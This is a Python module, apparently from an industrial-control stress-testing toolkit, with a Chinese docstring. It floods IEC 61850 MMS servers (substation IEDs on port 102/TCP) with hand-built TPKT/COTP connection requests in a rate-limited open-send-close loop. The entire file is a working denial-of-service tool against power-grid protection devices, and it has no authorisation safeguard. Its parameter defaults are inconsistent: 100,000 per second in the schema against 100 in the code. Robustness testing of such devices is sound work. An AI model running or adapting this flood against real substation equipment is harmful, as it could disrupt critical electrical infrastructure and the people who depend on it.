"""
測項：IEC 61850 MMS（COTP 連線建立）連線洪水
分類：IEC 61850 (MMS)（標準埠 102/TCP，與同專案既有的 IEC 61850 (GOOSE) 分類
     不同——GOOSE 是 Layer 2 廣播機制，MMS 是走 TCP/IP 的用戶端-伺服器協定，
     用於 SCADA/EMS 對變電站 IED 做遠端讀寫/報告訂閱，兩者是 IEC 61850 標準下
     互補的不同傳輸機制，因此獨立分類。）
說明：IEC 61850 MMS 走「ISO on TCP」協定堆疊（RFC 1006 TPKT + ISO 8073 COTP
     + ISO 8823 表達層 + ISO 8650 ACSE + MMS ASN.1），與同專案 Siemens S7 使用
     的底層堆疊完全相同（S7 也是 102/TCP + TPKT + COTP）。本測項實作該堆疊
     最基礎的第一步：COTP Connection Request（CR TPDU），快速建立又送出連線
     即斷開，測試 IED/MMS Server 對高頻連線建立的處理能力。

實作：手刻 TPKT + COTP CR TPDU（依 RFC 1006 / ISO 8073 標準格式組出）：
    TPKT: Version(1)=0x03, Reserved(1)=0x00, Length(2, big-endian)
    COTP CR TPDU: LI(1) + Code(1)=0xE0(CR) + DST-REF(2)=0x0000 + SRC-REF(2)
                  + Class(1)=0x00 + 選用參數：TPDU-Size(0xC0)、Calling-TSAP
                  (0xC1)、Called-TSAP(0xC2)

重要限制（設計精神比照同專案 s7/conn_pool_exhaustion.py 的做法）：
  - 只做到 COTP 連線建立這一層，「不」包含完整的 ISO 8823/ACSE/MMS Initiate-
    RequestPDU（MMS 的 ASN.1 BER 編碼複雜度高，且需要先知道對方支援的
    MMS 服務參數協商結果，非本測項範圍）。因此本測項測到的主要是 COTP
    連線處理負載，比純 TCP connection flood 更貼近真實情況（真正配置了
    COTP 連線狀態），但仍未達到完整 MMS Association 層級。
  - Calling/Called TSAP selector 使用一般實作常見的預設值，「未在真實 IEC
    61850 MMS 裝置（如 SEL/ABB/Siemens IED）上驗證過」是否會被特定廠牌實作
    接受，正式使用前建議先用 Wireshark（內建 COTP/MMS 解析器）確認目標裝置
    是否有回應 COTP Connection Confirm（CC TPDU），如有落差請依實際封包
    截取結果調整 TSAP 參數。
需求：無額外套件，純標準函式庫。
"""
import time

from ..common import RateLimiter, clamp_duration

NAME = "IEC 61850 MMS COTP 連線洪水"
CATEGORY = "IEC 61850 (MMS)"
PROTOCOL = "TCP"
DEFAULT_PORT = 102
TEST_TYPE = "resource"  # 連線建立 + COTP CR/CC 交握 + 關閉循環（churn）


def _build_cotp_cr(src_ref: int, calling_tsap: bytes, called_tsap: bytes) -> bytes:
    cotp_body = (
        bytes([0xE0])                      # CR TPDU code
        + b"\x00\x00"                       # DST-REF（未知，填 0）
        + src_ref.to_bytes(2, "big")        # SRC-REF
        + b"\x00"                           # Class 0, no options
        + bytes([0xC0, 0x01, 0x0A])         # 參數：TPDU size = 2^10 = 1024
        + bytes([0xC1, len(calling_tsap)]) + calling_tsap   # 參數：Calling-TSAP
        + bytes([0xC2, len(called_tsap)]) + called_tsap     # 參數：Called-TSAP
    )
    li = len(cotp_body)
    cotp = bytes([li]) + cotp_body
    tpkt_len = 4 + len(cotp)
    tpkt = bytes([0x03, 0x00]) + tpkt_len.to_bytes(2, "big")
    return tpkt + cotp


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 100000, "min": 1, "max": 100000, "desc": "每秒建立 COTP 連線次數"},
        "calling_tsap": {"type": "string", "default": "0100", "desc": "Calling TSAP selector（十六進位字串）"},
        "called_tsap": {"type": "string", "default": "0001", "desc": "Called TSAP selector（十六進位字串，部分裝置需與實際設定相符才會回應 CC）"},
        "connect_timeout": {"type": "float", "default": 2.0, "min": 0.5, "max": 5.0, "desc": "單次連線/收送逾時秒數"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    import socket

    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 100))
    timeout = float(params.get("connect_timeout", 2.0))
    try:
        calling_tsap = bytes.fromhex(str(params.get("calling_tsap", "0100")))
        called_tsap = bytes.fromhex(str(params.get("called_tsap", "0001")))
    except ValueError:
        calling_tsap, called_tsap = b"\x01\x00", b"\x00\x01"

    limiter = RateLimiter(rate)
    stats = {"connected": 0, "cc_received": 0, "no_response": 0, "errors": 0}
    src_ref = 1
    start = time.time()

    log_fn(f"[+] IEC 61850 MMS COTP 連線洪水 -> {target}:{port} @ {rate}/s, {duration}s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        src_ref = (src_ref + 1) & 0xFFFF
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))
            stats["connected"] += 1
            s.sendall(_build_cotp_cr(src_ref, calling_tsap, called_tsap))
            resp = s.recv(256)
            if len(resp) >= 6 and resp[0] == 0x03 and resp[5] == 0xD0:  # COTP CC TPDU code
                stats["cc_received"] += 1
            else:
                stats["no_response"] += 1
        except OSError as e:
            stats["errors"] += 1
            if stats["errors"] <= 5:
                log_fn(f"[!] 連線錯誤：{e}")
        finally:
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    return {
        "connected": stats["connected"],
        "cc_received": stats["cc_received"],
        "no_response": stats["no_response"],
        "errors": stats["errors"],
        "elapsed_sec": round(time.time() - start, 1),
    }
